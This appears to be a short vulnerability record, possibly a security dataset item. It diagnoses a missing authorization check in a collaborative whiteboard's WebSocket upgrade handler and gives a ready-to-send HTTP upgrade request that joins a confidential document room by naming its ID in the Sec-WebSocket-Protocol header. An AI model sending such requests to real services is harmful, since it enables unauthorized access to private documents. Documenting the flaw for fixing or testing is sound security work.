diagnosis: The collaborative whiteboard WebSocket upgrade handler parses canvas.doc.<documentId> directly from the Sec-WebSocket-Protocol header and joins the client to the private room without verifying whether the user is an authorized collaborator on documentId. Any client can connect with arbitrary document IDs in the subprotocol header to view confidential architectural diagrams and brainstorm notes.
exploit_request:
GET /ws/whiteboard HTTP/1.1
Host: canvas.collab-tools.com:3001
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: canvas.doc.doc_confidential_q4_product_design
